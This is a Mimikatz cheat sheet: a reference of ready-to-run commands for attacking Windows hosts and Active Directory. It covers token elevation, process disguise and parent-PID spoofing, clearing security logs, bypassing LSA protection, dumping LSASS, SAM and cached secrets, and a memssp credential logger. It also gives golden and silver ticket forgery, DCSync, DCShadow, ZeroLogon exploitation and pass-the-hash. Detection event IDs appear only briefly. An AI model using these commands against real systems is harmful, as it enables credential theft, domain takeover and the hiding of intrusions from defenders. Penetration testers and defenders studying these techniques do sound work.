# 🛡️ Mimikatz CheatSheet

<Info>
  Mimikatz is a powerful post-exploitation tool written in C by gentilkiwi. It extracts plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory. It also implements pass-the-hash, pass-the-ticket, and golden ticket attacks.
</Info>

![Mimikatz Architecture](/docs/Asset/Pasted%20image%2020260227171733.png)

## ⚙️ Logging & Miscellaneous

<Steps>
  <Step title="Start Logging">
    Allows saving Mimikatz session output to a file for evidence collection or reporting.

    ```bash
    mimikatz # log C:\Temp\msupdate.log
    ```

    - Creates a log file at the specified path.
    - You must define the full file path and file name.
  </Step>
  <Step title="Stop Logging">
    Stops writing output to the active log file.

    ```bash
    mimikatz # log /stop
    ```
  </Step>
</Steps>

<Tip>
  The `misc` module includes helper functions that may assist in bypassing application control mechanisms by launching trusted Windows binaries.

  ```bash
  mimikatz # misc::cmd
  mimikatz # misc::regedit
  mimikatz # misc::taskmgr
  ```
</Tip>

<Warning>
  Using `misc::clip` (Clipboard Capture) injects into `csrss.exe`. This will trigger Sysmon Event ID **8** (Remote thread creation).
</Warning>

## 👑 Privileges & Token Manipulation

<Info>
  - **4672** → Special privileges assigned to new logon
  - **4703** → A user right was adjusted
  - **4688** → Process creation
</Info>

<Tabs>
  <Tab title="Privilege Module">
    ```bash
    mimikatz # privilege::debug     # Enables SeDebugPrivilege (Required for LSASS)
    mimikatz # privilege::driver    # Enables SeLoadDriverPrivilege
    mimikatz # privilege::security  # Enables SeSecurityPrivilege (Security log access)
    mimikatz # privilege::backup    # Enables SeBackupPrivilege (Read protected files)
    mimikatz # privilege::restore   # Enables SeRestorePrivilege (Write bypassing ACLs)
    ```
  </Tab>
  <Tab title="Token Enumeration">
    ```bash
    mimikatz # token::whoami
    mimikatz # token::list
    mimikatz # token::list /user:administrator
    mimikatz # token::list /user:system
    ```
  </Tab>
  <Tab title="Token Impersonation">
    ```bash
    # Elevate to SYSTEM
    mimikatz # token::elevate 
    # Revert to previous token
    mimikatz # token::revert 
    # Elevate specifically to Domain Admin
    mimikatz # token::elevate /domainadmin 
    ```
  </Tab>
</Tabs>

<Danger>
  **MITRE ATT&CK:** [T1055](https://attack.mitre.org/techniques/T1055)

  Modifies executable signature/state on disk to execute payload under a disguised name.

  ```powershell
  .\processherpaderpng.exe .\mimikatz name.exe C:\windows\system32\lsass.exe
  ```

  ```bash
  mimikatz # privilege::debug
  mimikatz # token::elevate
  mimikatz # process::runp /run:"fullpath\name.exe" /ppid:<parentPID>
  ```
</Danger>

## 🕵️ Defense Evasion & Log Tampering

<Callout>
  **MITRE ATT&CK:** [T1070.001](https://attack.mitre.org/techniques/T1070/001) Clears the Security event log. Triggers Event ID **1102** (Security log cleared).

  ```bash
  mimikatz # privilege::debug
  mimikatz # event::clear
  ```
</Callout>

<Steps>
  <Step title="Drop Event Generation">
    Interferes with event logging generation to hide subsequent actions.

    ```bash
    mimikatz # event::drop
    ```
  </Step>
  <Step title="Parent PID Spoofing">
    **MITRE ATT&CK:** [T1134.004](https://attack.mitre.org/techniques/T1134/004/) Creates a process with a spoofed parent PID to evade behavioral detections based on process lineage.

    ```bash
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # process::runp /run:"powershell.exe" /ppid:5828
    ```

    _Note: If `/ppid` is not specified, default parent may be `lsass.exe`._
  </Step>
</Steps>

## 🌐 Remote Access & Services

<Tabs>
  <Tab title="RPC Server / Client">
    **Server (Windows Side)**

    ```bash
    mimikatz # rpc::server          # Start RPC server (Port 135)
    mimikatz # rpc::server /stop    # Stop RPC server
    mimikatz # rpc::server /secure  # Enable secure mode (encrypted channel)
    ```

    **Client (Remote System)**

    ```bash
    mimikatz # rpc::connect /server:172.20.10.1
    mimikatz # rpc::connect /server:172.20.10.1 /alg:RC4
    mimikatz # rpc::close
    ```
  </Tab>
  <Tab title="RDP Takeover">
    **MITRE ATT&CK:** [T1563.002](https://attack.mitre.org/techniques/T1563/002/)

    ```bash
    mimikatz # ts::multirdp # Enable multiple RDP sessions
    mimikatz # ts::sessions # List active sessions
    mimikatz # ts::remote /id:<sessionID> /target:<sessionID> /password:<password>
    ```
  </Tab>
  <Tab title="Service Control">
    Allows starting/stopping Windows services directly, useful for persistence.

    ```bash
    mimikatz # service::start bits
    mimikatz # service::stop bits
    mimikatz # service::+  # Start Mimikatz custom service
    mimikatz # service::-  # Stop Mimikatz custom service
    ```
  </Tab>
</Tabs>

## 🗄️ LSASS & Credential Dumping

<Info>
  - **Registry (SAM hive)** → Local account hashes
  - **LSASS Memory** → Active logon sessions
  - **SSP Modules** → Authentication packages (NTLM, Kerberos, WDIGEST)
</Info>

<Tabs>
  <Tab title="Bypass LSA Protection">
    **LSA Protection (RunAsPPL)** prevents unsigned processes from reading LSASS memory. Registry: `HKLM:\System\CurrentControlSet\Control\Lsa` -> `RunAsPPL` (DWORD `1` = Enabled)

    **Load Mimikatz Driver to bypass:**

    ```bash
    mimikatz # privilege::debug
    mimikatz # !+
    mimikatz # !processprotect /process:lsass.exe /remove
    ```

    **Patch LSA Protection:**

    ```bash
    mimikatz # lsadump::lsa /patch
    mimikatz # lsadump::lsa /inject
    ```
  </Tab>
  <Tab title="Dump LSASS Memory">
    Extracting live credentials from memory.

    ```bash
    mimikatz # privilege::debug
    mimikatz # sekurlsa::msv              # NTLM hashes
    mimikatz # sekurlsa::logonpasswords   # All available providers
    ```
  </Tab>
  <Tab title="Inject Custom SSP (memssp)">
    Loads a custom SSP into registry. Cleartext credentials will be logged to `C:\Windows\System32\mimilsa.log` upon user re-login.

    ```bash
    mimikatz # privilege::debug
    mimikatz # misc::memssp
    ```

    Force re-authentication:

    ```cmd
    rundll32 user32.dll,LockWorkStation
    ```
  </Tab>
  <Tab title="Dump SAM & Cache">
    **SAM Extraction (Requires SysKey bypass)**

    ```cmd
    reg save HKLM\SYSTEM system & reg save HKLM\SAM sam
    ```

    ```bash
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # lsadump::sam
    ```

    **Cached Credentials & Secrets**

    ```bash
    mimikatz # lsadump::cache    # Cached domain credentials
    mimikatz # lsadump::secrets  # VPN/RDP/Service account secrets
    ```
  </Tab>
</Tabs>

## 🎟️ Active Directory Attacks

<Tabs>
  <Tab title="Golden Ticket (TGT)">
    <Danger>
    Forges a Kerberos **TGT** using the `krbtgt` account hash. Grants persistent domain admin access even if the user's password is changed.
    **MITRE ATT&CK:** [T1558.001](https://attack.mitre.org/techniques/T1558/001)
    </Danger>

    **Requirements:** Domain FQDN, Domain SID, `krbtgt` hash, Target user RID.

    **1. Get Domain SID & krbtgt Hash:**
    ```bash
    mimikatz # lsadump::trust
    mimikatz # lsadump::dcsync /user:adolf\krbtgt /csv
    ```

    **2. Create Golden Ticket:**
    ```bash
    mimikatz # kerberos::golden /domain:adolf.local /sid:<domainSID> /user:administrator /id:500 /krbtgt:<NTLMhash> /ptt /ticket:C:\Temp\cna_golden
    ```
  </Tab>

  <Tab title="Silver Ticket (TGS)">
    <Warning>
    Forges a **TGS** for a specific service using the target server’s NTLM hash. Does not interact with the DC. Very stealthy.
    </Warning>

    **Common SPNs:**
    | SPN | Service |
    |---------|---------|
    | TERMSRV | RDP |
    | CIFS | SMB |
    | WSMAN | WinRM |
    | MSSQL | SQL |

    **1. Extract Machine Account Hash:**
    ```bash
    mimikatz # privilege::debug
    mimikatz # token::elevate
    mimikatz # lsadump::secrets   # extract $MACHINE.ACC
    ```

    **2. Forge Silver Ticket:**
    ```bash
    mimikatz # kerberos::golden /user:administrator /domain:domain.local /sid:<domainSID> /rc4:<MACHINE_NTLM> /target:hostname.domain.local /service:cifs /ptt
    ```
  </Tab>

  <Tab title="DCSync">
    <Danger>
    Impersonates a Domain Controller to request account replication data (pulls hashes).
    **MITRE ATT&CK:** [T1003.006](https://attack.mitre.org/techniques/T1003/006/) | **Detection:** Event ID `4662`
    </Danger>

    ```bash
    # Dump specific account (e.g., krbtgt)
    mimikatz # lsadump::dcsync /user:krbtgt
    
    # Dump all domain users
    mimikatz # lsadump::dcsync /all
    
    # Dump all users in CSV format
    mimikatz # lsadump::dcsync /all /csv
    ```
  </Tab>

  <Tab title="DCShadow">
    <Warning>
    **DCShadow** registers a rogue DC and pushes malicious replication data. It injects and replicates modified objects into the directory.
    **MITRE ATT&CK:** [T1207](https://attack.mitre.org/techniques/T1207)
    </Warning>

    ```bash
    # 1. Prepare attribute changes (Stack)
    mimikatz # lsadump::dcshadow /stack /object:username /attribute:primaryGroupID /value:512
    
    # 2. Push changes to the Domain Controller
    mimikatz # lsadump::dcshadow /push
    ```
  </Tab>

  <Tab title="ZeroLogon">
    <Danger>
    **ZeroLogon** is a critical vulnerability (CVE-2020-1472) in the Netlogon authentication protocol used by Windows Domain Controllers. An attacker within the network can impersonate a domain-joined computer — including the Domain Controller itself — by setting the machine account password to null.
    </Danger>

    ```bash
    # 1. Exploit the Netlogon flaw and set DC password to null
    mimikatz # lsadump::zerologon /target:hostname.domain.local /account:hostname$ /null /ntlm /exploit

    # 2. Use the obtained DC authentication to perform DCSync and dump krbtgt
    mimikatz # lsadump::dcsync /domain:domain.local /dc:hostname.domain.local /user:krbtgt /auth:hostname$ /authdomain:domain.local /authpassword:"" /authntlm
    ```
  </Tab>

  <Tab title="PTH & PTT">
    **Pass-The-Hash (PTH)**
    ```bash
    mimikatz # privilege::debug
    mimikatz # sekurlsa::pth /user:<user> /domain:adolf.local /ntlm:<hash> /run:cmd.exe
    ```

    **Over-Pass-The-Hash (OPTH)**
    Uses NTLM material to obtain Kerberos tickets.
    ```bash
    mimikatz # sekurlsa::pth /user:<user> /domain:domain.local /ntlm:<hash>
    ```

    **Pass-The-Ticket (PTT)**
    ```bash
    mimikatz # kerberos::list /export      # Dump tickets
    mimikatz # kerberos::ptt ticket.kirbi   # Import ticket
    mimikatz # process::run "net use \\servername\admin$"
    ```
  </Tab>
</Tabs>
